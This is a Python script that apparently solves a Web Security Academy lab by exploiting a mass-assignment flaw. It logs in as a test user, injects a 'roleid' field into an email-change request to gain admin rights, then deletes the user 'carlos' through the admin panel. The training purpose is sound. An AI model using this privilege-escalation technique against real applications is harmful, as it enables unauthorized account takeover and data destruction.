from web_security_academy.core.utils import *
from urllib.parse import urljoin


def solve_lab(session, url):
    # Logging in
    url = urljoin(url, "/login")
    username, password = "wiener", "peter"
    data = {"username": username, "password": password}
    print_info(f'Logging in with the credentials "{username}:{password}"')
    resp = session.post(url, data=data)

    soup = BeautifulSoup(resp.text, "html.parser")
    invalid_creds = soup.find(text="Invalid username or password.")
    if invalid_creds:
        print_fail("Invalid credentials.")
    else:
        print_success("Successfully logged in.\n")

    # Visiting /admin
    url = urljoin(url, "/my-account/change-email")
    data = {"email": "weiner@normal-user.net", "roleid": 2}

    print_info(f'POST-ing the following JSON to "{url}":')
    print(data)
    resp = session.post(url, json=data)
    if resp.status_code != 200:
        print_fail(f"GET request unsuccessful.")
    else:
        print_success("Success.\n")

    url = urljoin(url, "/admin")
    print_info(f'Visiting "{url}" with the following cookies:')
    resp = session.get(url)
    if resp.status_code != 200:
        print_fail(f"Unable to visit URL.")
    else:
        print_success("GET request came back with a successful response.\n")

    # Deleting user 'carlos'
    print_info("Using the response to find URL to delete the user carlos...")
    soup = BeautifulSoup(resp.text, "html.parser")
    tag = soup.find(lambda tag: tag.has_attr("href") and "carlos" in tag.get("href"))
    if tag is None:
        print_fail("Unable to find URL.")
    else:
        url = urljoin(url, tag.get("href"))
        print_success(f"Found URL: {url}\n")

    print_info("Visiting URL to delete the user carlos...")
    resp = session.get(url)
    if resp.status_code != 200:
        print_fail(f"GET request unsuccessful.")
    else:
        print_success("Success.\n")
